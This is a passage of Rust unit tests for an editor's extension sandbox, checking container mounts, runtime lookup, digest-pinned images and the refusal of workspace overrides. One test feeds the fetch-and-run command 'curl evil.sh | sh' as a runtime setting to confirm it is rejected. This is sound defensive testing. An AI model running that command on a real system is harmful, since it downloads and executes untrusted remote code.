            containerise(&config, &container(), "acme.ext"),
            Err(SandboxError::BootstrapNotMounted {
                bootstrap: absolute_str("somewhere/else/bootstrap.js")
            })
        );
    }

    #[test]
    fn paths_translate_into_the_container_and_back_out_of_range() {
        let mounts = Mounts::new(&config().readable_roots).expect("mounts");
        assert_eq!(
            mounts.inside(&absolute("opt/deco/host/src/bootstrap.js")),
            Some("/deco/mnt/0/src/bootstrap.js".to_owned())
        );
        assert_eq!(
            mounts.inside(&absolute("home/u/.deco/extensions/acme.ext")),
            Some("/deco/mnt/1".to_owned())
        );
        assert_eq!(
            mounts.inside(&absolute("home/u/.deco/extensions/acme.ext/out/main.js")),
            Some("/deco/mnt/1/out/main.js".to_owned())
        );
        // Paths that are not mounted have no container path. This includes a
        // sibling extension directory.
        assert_eq!(mounts.inside(&absolute("home/u/project/src/lib.rs")), None);
        assert_eq!(
            mounts.inside(&absolute("home/u/.deco/extensions/other.ext")),
            None
        );
        assert_eq!(mounts.inside(&absolute("etc/passwd")), None);
    }

    #[test]
    fn a_named_runtime_has_to_be_one_deco_will_start() {
        let settings = settings(Scope::User, RUNTIME_KEY, json!("curl evil.sh | sh"));
        assert_eq!(
            ContainerConfig::resolve(&settings, None),
            Err(SandboxError::UnknownRuntime {
                name: "curl evil.sh | sh".to_owned()
            })
        );
    }

    #[test]
    fn a_missing_runtime_names_the_way_out_rather_than_taking_it() {
        // No runtime means no extensions, not extensions with one layer fewer.
        // The message must name the setting so the user knows how to proceed.
        let error = ContainerConfig::resolve(&Settings::empty(), None)
            .expect_err("nothing should be found on an empty PATH");
        let said = error.to_string();
        assert!(said.contains("podman"), "{said}");
        assert!(said.contains("docker"), "{said}");
        assert!(said.contains(SANDBOX_KEY), "{said}");
        assert!(said.contains("process"), "{said}");
    }

    #[test]
    fn an_absolute_runtime_is_taken_as_given() {
        let settings = settings(
            Scope::User,
            RUNTIME_KEY,
            json!(absolute_str("opt/bin/podman")),
        );
        let resolved = ContainerConfig::resolve(&settings, None).expect("an absolute path");
        assert_eq!(resolved.runtime, absolute("opt/bin/podman"));
        assert_eq!(resolved.image, DEFAULT_IMAGE);
    }

    #[test]
    fn a_workspace_cannot_choose_the_image_or_the_runtime() {
        let mut settings = Settings::empty();
        let mut layer = serde_json::Map::new();
        layer.insert(
            RUNTIME_KEY.to_owned(),
            json!(absolute_str("tmp/evil-runtime")),
        );
        layer.insert(IMAGE_KEY.to_owned(), json!(DEFAULT_IMAGE));
        settings.set_layer(Scope::Workspace, layer);
        // No runtime is found, because the workspace's runtime is ignored.
        assert!(matches!(
            ContainerConfig::resolve(&settings, None),
            Err(SandboxError::NoRuntime { .. })
        ));
    }

    #[test]
    fn an_unpinned_image_from_the_user_is_still_refused() {
        // User settings are read, but they do not bypass the digest rule. Only a
        // digest ensures that an image is the same one that was reviewed.
        let mut settings = settings(
            Scope::User,
            RUNTIME_KEY,
            json!(absolute_str("usr/bin/podman")),
        );
        settings.set(Scope::User, IMAGE_KEY, json!("node:22"));
        assert_eq!(
            ContainerConfig::resolve(&settings, None),
            Err(SandboxError::UnpinnedImage {
                image: "node:22".to_owned()
            })
        );
    }

    #[test]
    fn preparing_a_host_without_a_runtime_fails_instead_of_running_it_bare() {
        // Without a container runtime, `prepare` fails instead of downgrading.
        // It must not produce a bare process unless the policy selects one.
        let error = prepare(&Settings::with_defaults(), &config(), "acme.ext", None)
            .expect_err("no runtime, so no host");
        assert!(matches!(error, SandboxError::NoRuntime { .. }));
    }

    #[test]
    fn asking_for_the_process_gets_the_process_and_says_so() {
        let settings = settings(Scope::User, SANDBOX_KEY, json!("process"));
        let made = prepare(&settings, &config(), "acme.ext", None).expect("no runtime needed");
        assert_eq!(made.sandbox, Sandbox::Process);
        assert_eq!(made.mounts, None);
        // The host's own command line, without a container: the program is Node.
        assert_eq!(made.spec.program, absolute("usr/bin/node"));
        assert!(made.spec.args.iter().any(|arg| arg == "--permission"));
        // Paths are this machine's, because the host opens them directly.
        assert_eq!(
            made.seen_by_host(&absolute("opt/deco/host/src/bootstrap.js")),
            Some(absolute_str("opt/deco/host/src/bootstrap.js"))
        );
    }

    #[test]
    fn a_prepared_container_translates_the_paths_that_go_over_the_wire() {
        let mut settings = settings(
            Scope::User,
            RUNTIME_KEY,
            json!(absolute_str("usr/bin/podman")),
        );
        // A workspace override, to check that it is reported instead of
        // discarded.
        let mut workspace = serde_json::Map::new();
        workspace.insert(SANDBOX_KEY.to_owned(), json!("process"));
        settings.set_layer(Scope::Workspace, workspace);

        let made = prepare(&settings, &config(), "acme.ext", None).expect("an absolute runtime");
        assert_eq!(made.sandbox, Sandbox::Container);
        assert_eq!(made.ignored, vec![Scope::Workspace]);
        assert_eq!(made.spec.program, absolute("usr/bin/podman"));
        assert_eq!(
            made.seen_by_host(&absolute("home/u/.deco/extensions/acme.ext")),
            Some("/deco/mnt/1".to_owned())
        );
        // Not mounted, so there is no container path. This is better than a path
        // that would fail to open inside the container with no visible reason.
        assert_eq!(made.seen_by_host(&absolute("home/u/project/a.rs")), None);
    }

    #[test]
    fn finding_a_runtime_prefers_podman_and_returns_an_absolute_path() {
        let dir = std::env::temp_dir().join(format!("deco-runtimes-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a directory");
        let name = |n: &str| {
            if cfg!(windows) {
                format!("{n}.exe")
            } else {
                n.to_owned()
            }
        };
        std::fs::write(dir.join(name("docker")), "").expect("a file");
        let path = std::ffi::OsString::from(dir.display().to_string());

        // Only docker is present, so docker is found.
        let found = find_runtime(&RUNTIMES, Some(&path)).expect("docker");
        assert_eq!(found, dir.join(name("docker")));
        assert!(found.is_absolute());

        // Both are present: podman is preferred because it is rootless.
        std::fs::write(dir.join(name("podman")), "").expect("a file");
        assert_eq!(
            find_runtime(&RUNTIMES, Some(&path)),
            Some(dir.join(name("podman")))
        );

        assert_eq!(find_runtime(&RUNTIMES, None), None);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
